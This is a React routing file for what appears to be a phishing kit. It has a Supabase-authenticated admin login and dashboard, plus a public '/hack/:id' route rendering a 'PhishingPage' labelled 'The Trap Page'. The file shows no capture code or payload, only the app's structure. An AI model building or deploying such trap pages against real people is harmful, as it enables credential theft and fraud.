import { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom';
import { useEffect, useState } from 'react';
import { supabase } from './utils/supabase';

// Pages Import
import Dashboard from './pages/Dashboard';
import PhishingPage from './pages/PhishingPage';
import Login from './pages/Login';

function App() {
  const [session, setSession] = useState(null);

  useEffect(() => {
    // Check current session
    supabase.auth.getSession().then(({ data: { session } }) => {
      setSession(session);
    });

    // Listen for auth changes
    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setSession(session);
    });

    return () => subscription.unsubscribe();
  }, []);

  return (
    <BrowserRouter>
      <Routes>
        {/* Admin Login - Root Path */}
        <Route 
          path="/" 
          element={!session ? <Login /> : <Navigate to="/dashboard" />} 
        /> 

        {/* Protected Dashboard - Sirf login ke baad dikhega */}
        <Route 
          path="/dashboard" 
          element={session ? <Dashboard /> : <Navigate to="/" />} 
        />

        {/* The Trap Page - Sabke liye open hai */}
        <Route 
          path="/hack/:id" 
          element={<PhishingPage />} 
        />

        {/* 404 Redirect - Agar koi galat URL daale */}
        <Route path="*" element={<Navigate to="/" />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;
